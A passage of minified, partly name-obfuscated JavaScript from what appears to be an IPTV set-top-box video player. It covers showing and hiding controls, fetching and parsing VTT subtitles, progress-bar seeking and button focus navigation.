$_('progressBut').style.left=(pos-9)+"px"},triggerHide:function(t,n){var c=this;clearTimeout(c.hideTimerId);if(handler=="menu"&&c.stopped)return;c.hideTimerId=setTimeout(function(){c.hidePlayer(n)},(t||5000))},hidePlayer:function(force){var c=this;if(adsPage.state()==2)return;try{if(!force&&($_("loading").style.display=="block"||c.glSec>0||handler=="qual"||c.paused||adsPage.state()==2)){}else{console.log("hide player");if(maJor.platform()=="android-device")andr.cmd("hideSystemUI");if(maJor.platform()=="mag"){try{stb.SetWinMode(1)}catch(e){}
try{stb.SetTopWin(1)}catch(e){}}else if(maJor.platform()=="dune"){$_("player").style.display="none"}
if(info_mode==1)return;else if(maJor.params.get('time')){$_("playerBottom").style.display="none";$_("buttonTop").style.display="none";$_("vrecovery").style.display="none";$_("infR").style.display="none";$_("pstream").style.display="block";$_("player_time").style.display="block"}else{$_("playerBottom").style.display="none";$_("buttonTop").style.display="none";$_("pstream").style.display="none";$_("vrecovery").style.display="none"}
$_("thumb").style.display="none";if($_("arrowtime"))$_("arrowtime").style.display="none";clearTimeout(c.hideTimerId);c.hideTimerId=setTimeout(function(){if(handler=="player"){vPlayer.pos=[1,1]};vPlayer.setFocus()},45000)}}catch(e){jsshowErr("hidePlayer "+e.message+"-"+$_("loading").style.display+"-"+c.glSec+"-"+c.paused+"-"+force,1)}},showPlayer:function(hide){var c=this;if(hide)c.triggerHide();if(maJor.platform()=="mag"){try{stb.SetWinMode(0)}catch(e){}
try{stb.SetTopWin(0)}catch(e){}}else if(maJor.platform()=="dune")$_("player").style.display="block";$_("playerBottom").style.display="block";if(adsPage.state()!=2){$_("infR",c.getInfo());$_("infR").style.display="block";$_("buttonTop").style.display="block";$_("pstream").style.display="block";$_("vrecovery").style.display="block"}
c.getVideoPlayInfo()},subtitles:{exis:function(){var c=vPlayer;return c.playElement.subsrc&&c.playElement.subsrc.length},clear:function(){var c=vPlayer;clearInterval(c.subtitles.timerSub);c.subtitles.el={"subtitles":[]};$_("subtitle").style.display="none"},parse:function(){var c=vPlayer;if(c.playElement.subtitles){if(typeof c.playElement.subtitles=="string")c.playElement.subsrc=c.playElement.subtitles=lIlI1VBOOlI01QYpr(c.playElement.subtitles);else c.playElement.subsrc=c.playElement.subtitles;c.playElement.sub_sel=0}},getName:function(sel){var c=vPlayer;if(sel==null)sel=c.playElement.sub_sel;if(!sel)return"_FPOtkl_";else return c.playElement.subsrc[sel-1][0]},timerSub:null,lIllOOI001ey1l00I1Ypr:function(){var c=vPlayer;if($_("subtitle").style.display=="none")return clearInterval(this.timerSub);var curTime=c.getCur()*this.moveSub;try{var subtitle='';if(curTime.toFixed(1)>=this.videosub_timecode_min(this.el.subtitles[this.el.subcount][1])&&curTime.toFixed(1)<=this.videosub_timecode_max(this.el.subtitles[this.el.subcount][1])){subtitle=this.el.subtitles[this.el.subcount][2];if(this.el.subtitles[this.el.subcount][3])subtitle+="<br>"+this.el.subtitles[this.el.subcount][3]}
if(curTime.toFixed(1)>this.videosub_timecode_max(this.el.subtitles[this.el.subcount][1])&&this.el.subcount<(this.el.subtitles.length-1)){this.el.subcount++}
$_("subtitle",subtitle)}catch(e){$_("subtitle","")}},el:{"subtitles":[]},moveSub:1,videosub_timecode_min:function(tc){if(tc&&tc.split(' --> '))return this.l00l11II0TOt0IQI0OYpr(tc.split(' --> ')[0]);return 0},videosub_timecode_max:function(tc){if(tc&&tc.split(' --> '))return this.l00l11II0TOt0IQI0OYpr(tc.split(' --> ')[1]);return 1},l00l11II0TOt0IQI0OYpr:function(tc){var tc1=tc.split(',');var tc2=tc1[0].split(':');if(tc2.length==2)tc2.unshift(0);var secs=Math.floor(tc2[0]*60*60)+Math.floor(tc2[1]*60)+Math.floor(tc2[2]);return secs},parseVtt:function(xmlDoc){this.el.subtitles=[];var records=xmlDoc.replace(/\r/g,"").split('\n\n');for(var r=0;r<records.length;r++){if(records[r].indexOf("-->")==-1)continue;var record=records[r].split('\n');if(record[0].indexOf("-->")>0){record.unshift("");this.el.subtitles.push(record)}else{this.el.subtitles.push(record)}}
this.l01ll0PDS0I0IYpr()},l01ll0PDS0I0IYpr:function(){if($_("subtitle").style.display=="none")return;this.el.subcount=0;var curTime=vPlayer.getCur()*this.moveSub;while(this.videosub_timecode_max(this.el.subtitles[this.el.subcount][1])<curTime.toFixed(1)){this.el.subcount++;if(this.el.subcount>this.el.subtitles.length-1){this.el.subcount=this.el.subtitles.length-1;break}}},splitHls:function(xmlDoc){var x;var regexp=new RegExp("(https?://.*)","ig");var n=0,s="";var U=[];while((x=regexp.exec(xmlDoc))!=null){U.push(x[1])}
function getU(u){uHelper.create("directnoheader|proxy").get(u).parse=function(resp){if(resp){s+=resp;n++;if(n<U.length)getU(U[n]);else{vPlayer.subtitles.parseVtt(s)}}}}
getU(U[n])},lO011IIO1olgIZIOIIOIYpr:function(){var c=vPlayer;var subtitlesrc='';var subsrc=c.playElement.subsrc,sub_sel=c.playElement.sub_sel;clearInterval(this.timerSub);if(sub_sel<1)c.playElement.sub_sel=subsrc.length;else if(sub_sel>subsrc.length)c.playElement.sub_sel=0;sub_sel=c.playElement.sub_sel;if(subsrc.length&&sub_sel){var src=subsrc[sub_sel-1];$_("subtitle").style.display="block";if(typeof src=="string"){src=["["+sub_sel+"]",src];subtitlesrc=src}
subtitlesrc=src[1];this.moveSub=src[3]||1}else{$_("subtitle").style.display="none";return}
if(subtitlesrc.indexOf("md5hash")&&src[2]){uHelper.create("directnoheader|proxy").get(trylink(src[2])).parse=function(s){if(s){c.playElement.subsrc[sub_sel-1][2]=null;c.playElement.subsrc[sub_sel-1][1]=c.playElement.subsrc[sub_sel-1][1].replace("md5hash",s);c.subtitles.lO011IIO1olgIZIOIIOIYpr()}else kjtYpr.popUp("Error download/parse subtitles<br>"+src[2],2000)}}else{this.timerSub=setInterval("vPlayer.subtitles.lIllOOI001ey1l00I1Ypr();",320);uHelper.create("directnoheader|proxy").get(trylink(subtitlesrc)).parse=function(s){if(s){if(s.indexOf("#EXTM3U")>=0){return c.subtitles.splitHls(s)}
c.subtitles.parseVtt(s)}else{$_("subtitle").style.display="none";c.playElement.sub_sel=0;kjtYpr.popUp("Error download subtitles!<br>"+subtitlesrc,2000)}}
this.el.subcount=0}}},barWidth:function(){return $_("progressBarClick").offsetWidth},flastView:function(){var c=this;if(gP("is_iptv")>2&&c.lastPlayElement){setSelect(c.lastPlayElement.index);c.llll1Zvc0cl1QllOYpr(c.lastPlayElement)}else if(c.playUrl)c.l1100OlxlQQ00lO0Ypr(c.playUrl,c.getCur())},selectedButton:function(){var c=this;c.pos[1]=parseInt(c.pos[1]);c.pos[0]=parseInt(c.pos[0]);if(c.pos[1]==1&&c.pos[0]<2){}else if(adsPage.state())return;if(c.pos[1]==1){switch(c.pos[0]){case 0:if(c.paused&&c.getCur()>1){c.play();c.pos[0]=1;c.setFocus(0)}else c.pause();break;case 1:if(c.l0QOOILTvlIO0O1Ypr){c.l1l0O00UvlOlOO111Ypr()}else if(!c.paused&&c.getCur()>1){c.pause();c.pos[0]=0;c.setFocus(0)}else c.play();break;case 2:c.frw(-1);break;case 3:c.frw(1);break;case 4:newOptions();break;case 5:vPlayer.player().setSize(parseInt(maJor.params.get('xmode'))+1);vPlayer.showPlayer();break;case 6:c.flastView(!0);break;case 7:vPlayer.lll110IjuIxI11IIYprNext(-1);c.pos[0]=7;c.setFocus(0);break;case 8:vPlayer.lll110IjuIxI11IIYprNext(1);c.pos[0]=8;c.setFocus(0);break}}else if(c.pos[1]==2){if(!c.paused)c.pause();else c.play()}else if(c.pos[1]==3){switch(c.pos[0]){case 0:c.minimizeplayer(!0);break;case 1:info_mode=0;c.hidePlayer(1);c.deletePauseOverlay();if(c.player().fullscreen)c.player().fullscreen();break;case 2:c.lll0Q10I0lI1O0Oll0OOYpr();break}}},resetFocus:function(){for(var i in maJor.allPlayerButton){$_(i).style.background="";$_(i).style.color="#eeeeee"}},updateProgressBar:function(isRowID2){var progressBarClick=$_("progressBarClick");var progressBut=$_("progressBut");if(progressBarClick){progressBarClick.style.height=isRowID2?"12px":"8px";progressBarClick.style.marginTop=isRowID2?"-4px":"-1px"}
if(progressBut){progressBut.style.display=isRowID2?"block":"none"}},pos:[1,1],maxpos0:[8,0,2],setFocus:function(idx,idy){var c=this;if(idy){var maxY=3;var minY=1;c.pos[1]+=(idy>0?1:-1);if(c.pos[1]>maxY)c.pos[1]=minY;if(c.pos[1]<minY)c.pos[1]=maxY;if(!vPlayer.is_arc&&!is_vod()&&pstream&&c.pos[1]===2){c.pos[1]+=(idy>0?1:-1);if(c.pos[1]>maxY)c.pos[1]=minY;if(c.pos[1]<minY)c.pos[1]=maxY}
if(c.pos[1]===1)c.pos[0]=1;if(c.pos[1]===3)c.pos[0]=2}
if(idx){var minX=null,maxX=null;for(var i in maJor.allPlayerButton){if(maJor.allPlayerButton.hasOwnProperty(i)){var button=maJor.allPlayerButton[i];if(button.row[1]===c.pos[1]){if(minX===null||button.row[0]<minX)minX=button.row[0];if(maxX===null||button.row[0]>maxX)maxX=button.row[0]}}}
if(idx>0){c.pos[0]=(c.pos[0]<maxX)?c.pos[0]+1:minX}else if(idx<0){c.pos[0]=(c.pos[0]>minX)?c.pos[0]-1:maxX}}
if(c.pos[1]===2){c.updateProgressBar(!0);if(idx!==0){c.frw(idx*60)}else{c.resetFocus()}}else{c.updateProgressBar(!1);for(var i in maJor.allPlayerButton){if(maJor.allPlayerButton.hasOwnProperty(i)){var button=maJor.allPlayerButton[i];if(button.row[0]===c.pos[0]&&button.row[1]===c.pos[1]){c.resetFocus();var elem=$_(i);if(elem){elem.style.background=(maJor.supports.svg?"#eeeeee":"#c1c1c1");elem.style.color="#000000"}
break}}}}},arrowSet:function(x){$_("arrowtime").style.left=x+"px";if($_("arrowtime").offsetLeft<0)$_("arrowtime").style.left="0px";else if($_("arrowtime").offsetLeft+$_("arrowtime").offsetWidth>$_("progressBarClick").offsetWidth)
$_("arrowtime").style.left=$_("progressBarClick").offsetWidth-$_("arrowtime").offsetWidth+"px"},init:function(){var c=this;video=$_('video');if($_('progressBarClick')){$_('progressBarClick').onclick=function(e){if(adsPage.state())return;var x=e.pageX-$(this).offset().left;var proc=x/c.barWidth();if(proc<0)proc=0;if(proc>1)proc=1;if(x<0)x=0;if(c.is_arc){var tt=Math.ceil(T.timestamp-(1-proc)*gV(c.playElement,"catchup_days")*24*3600);c.arc_fwd=0;c.iptv.arc.timestamp=0;c.arcfwd(Math.ceil(tt-T.timestamp))}else c.seek(proc*c.getTotal())};$_("progressBarClick").onmouseout=function(event){$_("arrowtime").style.display="none";$_("progressBarClick").style.height="8px";$_("progressBut").style.display="none";$_("progressBarClick").style.marginTop="-1px"};$_('progressBarClick').onmousemove=function(e){$_("progressBarClick").style.height="12px";$_("progressBarClick").style.marginTop="-4px";$_("progressBut").style.display="block";var totalTime=c.getTotal();var pos=e.pageX-$(this).offset().left;var proc=pos/c.barWidth();if(proc<0)proc=0;if(proc>1)proc=1;if(c.is_arc){$_("arrowtime").style.display="block";c.arrowSet(pos);var tt=Math.ceil(T.timestamp-(1-proc)*gV(c.playElement,"catchup_days")*24*3600);$_('arrowtime',dt(tt,!0,!0))}else if(totalTime>5){$_("arrowtime").style.display="block";var y=Math.ceil(proc*totalTime);$_('arrowtime',getTimeFromMS(y));pos=pos-43}
c.arrowSet(pos)}}
$_('jw').onmousemove=$_('player').onmousemove=$_('video').onmousemove=c.OnMouseMove},whitestripes:0,setWhitestripes:function(x){var c=vPlayer;if(x!=null)c.whitestripes+=x;if(c.whitestripes<1){c.whitestripes=0;$_("whitestripes1").style.display="none";$_("whitestripes2").style.display="none"}else{if(c.whitestripes>100)c.whitestripes=100;$_("whitestripes1").style.display="block";$_("whitestripes2").style.display="block";$_("whitestripes1").style.height=c.whitestripes+"px";$_("whitestripes2").style.height=c.whitestripes+"px";$_("whitestripes2").style.top=(720-c.whitestripes)+"px"}}}
var Player={};setTimeout(function(){window.tonloaded=1;maJor.start()},100)